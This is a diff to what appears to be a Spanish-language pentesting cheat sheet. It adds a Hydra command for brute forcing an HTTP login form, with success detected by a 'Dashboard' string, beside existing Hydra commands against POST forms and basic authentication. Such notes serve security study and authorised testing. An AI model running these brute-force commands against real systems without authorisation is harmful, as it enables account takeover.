@@ -48,6 +48,11 @@ hydra -l none -P <PATH-TO-PASSWORD.lst> -f <IP-ADDRESS> https-post-form "/db/ind
 hydra -l admin -P <PATH-TO-PASSWORD.lst> -f <IP-ADDRESS> -s <PORT> http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
 ```
 
+#### Fuerza bruta a un formulario de inicio de sesion por HTTP donde al ingresar una contraseña correcta manda un mensaje
+```
+hydra -l admin -P <PATH-TO-PASSWORD.lst> -f <IP-ADDRESS> -s <PORT> http-post-form "/:username=^USER^&password=^PASS^:S=Dashboard"
+```
+
 #### Ataque de Fuerza Bruta a una Authenticacion Basica que se encuentre en un directorio web
 ```
 hydra -l admin -P <PATH-TO-PASSWORD.lst> -s <PORT> -f <IP-ADDRESS> http-get /<DIRECTORY>
